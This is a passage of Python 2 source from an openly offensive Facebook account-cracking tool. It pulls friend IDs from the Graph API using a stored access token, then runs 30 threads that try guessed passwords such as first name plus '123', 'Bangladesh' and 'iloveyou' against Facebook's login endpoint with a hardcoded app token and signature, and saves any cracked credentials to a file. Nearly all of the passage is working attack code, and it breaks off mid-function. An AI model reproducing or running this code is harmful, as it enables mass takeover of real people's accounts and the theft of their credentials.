    print '\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m] \x1b[1;93mFinished ...'
    print '\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m] \x1b[1;93mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m] \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;93mfile Save \x1b[1;91m: \x1b[1;92mdone/indo.txt'
    print '\x1b[1;96m--------------------------------------------------'
    raw_input('\x1b[1;97m[<\x1b[1;93mBack\x1b[1;97m>]')
    menu()


def crack_bangla():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    print '\x1b[1;96m--------------------------------------------------'
    print '\x1b[1;97m[\x1b[1;93m01\x1b[1;97m]\x1b[1;94m Hack From Friend list'
    print '\x1b[1;97m[\x1b[1;93m02\x1b[1;97m]\x1b[1;94m Hack From Public Frendlist'
    print '\x1b[1;97m[\x1b[1;93m03\x1b[1;97m]\x1b[1;94m Hack From File'
    print '\x1b[1;97m[\x1b[1;91m00\x1b[1;97m]\x1b[1;91m Back'
    print '\x1b[1;96m--------------------------------------------------'
    pilih_bangla()


def pilih_bangla():
    teak = raw_input('\x1b[1;96mChoose Any Option \x1b[91m:\x1b[1;92m ')
    if teak == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Fill Correctly !'
        pilih_bangla()
    elif teak == '1' or teak == '01':
        os.system('clear')
        print logo
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    else:
        if teak == '2' or teak == '02':
            os.system('clear')
            print logo
            idb = raw_input('\x1b[1;97m[\x1b[1;96m\xe2\x97\x8f\x1b[1;97m]\x1b[1;96m ID Public/friend \x1b[1;91m:\x1b[1;92m ')
            try:
                pok = requests.get('https://graph.facebook.com/' + idb + '?access_token=' + toket)
                sp = json.loads(pok.text)
                print '\x1b[1;97m[\x1b[1;96m\xe2\x97\x8f\x1b[1;97m]\x1b[1;96m Nama \x1b[1;91m:\x1b[1;92m ' + sp['name']
            except KeyError:
                print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] ID public / friend does not exist !'
                raw_input('\n\x1b[1;96m[\x1b[1;97m<Back>\x1b[1;96m]')
                crack_bangla()
            except requests.exceptions.ConnectionError:
                print '[!] No internet Conection!'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idb + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif teak == '3' or teak == '03':
            os.system('clear')
            print logo
            try:
                idlist = raw_input('\x1b[1;97m[\x1b[1;96m\xe2\x97\x8f\x1b[1;97m]\x1b[1;96m Name File \x1b[1;91m:\x1b[1;92m ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except KeyError:
                print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] File does not exist ! '
                raw_input('\n\x1b[1;92m[ \x1b[1;97mBack \x1b[1;92m]')
            except IOError:
                print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] File does not exist !'
                raw_input('\n\x1b[1;96m[\x1b[1;97m<Back>\x1b[1;96m]')
                crack_bangla()

        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Fill Correctly !'
            pilih_bangla()
        print '\x1b[1;97m[\x1b[1;96m\xe2\x97\x8f\x1b[1;97m]\x1b[1;96m Total ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
        print '\x1b[1;97m[\x1b[1;96m\xe2\x97\x8f\x1b[1;97m]\x1b[1;96m Stop Tekan CTRL+Z'
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;97m[\x1b[1;96m\xe2\x97\x8f\x1b[1;97m]\x1b[1;96m Crack start ' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\x1b[1;96m--------------------------------------------------'
    print '\n\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95mUse Airplane Mode If Nothing Is Working'
    print '\n\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95mCheckpoint Account Open After 7 days'
    print '\n\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95m Crated By : Angga Kurniawan'
    print '\x1b[1;96m--------------------------------------------------'

    def main(arg):
        sys.stdout.write(('\r[]').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos1
                oke = open('done/indo.txt', 'a')
                oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos1
                cek = open('done/indo.txt', 'a')
                cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos2
                    oke = open('done/indo.txt', 'a')
                    oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos2
                    cek = open('done/indo.txt', 'a')
                    cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos3
                        oke = open('done/indo.txt', 'a')
                        oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos3
                        cek = open('done/indo.txt', 'a')
                        cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = 'Bangladesh'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/indo.txt', 'a')
                            oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos4
                            cek = open('done/indo.txt', 'a')
                            cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = 'Bangladesh123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos5
                                oke = open('done/indo.txt', 'a')
                                oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos5
                                cek = open('done/indo.txt', 'a')
                                cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '123456'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos6
                                    oke = open('done/indo.txt', 'a')
                                    oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos6
                                    cek = open('done/indo.txt', 'a')
                                    cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['last_name'].lower() + '123456'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos7
                                        oke = open('done/indo.txt', 'a')
                                        oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos7
                                        cek = open('done/indo.txt', 'a')
                                        cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = 'Bangal786'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos8
                                            oke = open('done/indo.txt', 'a')
                                            oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos8
                                            cek = open('done/indo.txt', 'a')
                                            cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;96m--------------------------------------------------'
    print '\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m] \x1b[1;93mFinished ...'
    print '\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m] \x1b[1;93mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m] \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;93mfile Save \x1b[1;91m: \x1b[1;92mdone/indo.txt'
    print '\x1b[1;96m--------------------------------------------------'
    raw_input('\x1b[1;97m[<\x1b[1;93mBack\x1b[1;97m>]')
    menu()


def crack_usa():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    print '\x1b[1;96m--------------------------------------------------'
    print '\x1b[1;97m[\x1b[1;93m01\x1b[1;97m] Hack From Friend list'
    print '\x1b[1;97m[\x1b[1;93m02\x1b[1;97m] Hack From Public Frendlist'
    print '\x1b[1;97m[\x1b[1;93m03\x1b[1;97m] Hack From File'
    print '\x1b[1;97m[\x1b[1;91m00\x1b[1;97m] Back'
    print '\x1b[1;96m--------------------------------------------------'
    pilih_usa()


def pilih_usa():
    teak = raw_input('\x1b[1;95mChoose Any Option \x1b[91m:\x1b[1;92m ')
    if teak == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Fill Correctly !'
        pilih_usa()
    elif teak == '1' or teak == '01':
        os.system('clear')
        print logo
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    else:
        if teak == '2' or teak == '02':
            os.system('clear')
            print logo
            idt = raw_input('\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95mID Public/Friend \x1b[1;91m:\x1b[1;92m ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95mNama \x1b[1;91m:\x1b[1;92m ' + op['name']
            except KeyError:
                print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] ID public / friend does not exist !'
                raw_input('\n\x1b[1;95m[\x1b[1;97m<Back>\x1b[1;95m]')
                crack_usa()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] No internet Conection !'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif teak == '3' or teak == '03':
            os.system('clear')
            print logo
            try:
                idlist = raw_input('\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95mNama File\x1b[1;91m :\x1b[1;92m ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except KeyError:
                print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] File does not exist! '
                raw_input('\n\x1b[1;92m[ \x1b[1;97mBack \x1b[1;92m]')
            except IOError:
                print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] File does not exist !'
                raw_input('\n\x1b[1;95m[\x1b[1;97m<Back>\x1b[1;95m]')
                crack_usa()

        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Fill Correctly !'
            pilih_usa()
        print '\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
        print '\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95mStop Tekan CTRL+Z'
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95mCrack Start ' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\x1b[1;96m--------------------------------------------------'
    print '\n\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95mUse Airplane Mode If Nothing Is Working'
    print '\n\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95mCheckpoint Account Open After 7 days'
    print '\n\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95m Crated By : Angga Kurniawan'
    print '\x1b[1;96m--------------------------------------------------'

    def main(arg):
        sys.stdout.write(('\r[]').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = 'iloveyou'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos1
                oke = open('done/indo.txt', 'a')
                oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos1
                cek = open('done/indo.txt', 'a')
                cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
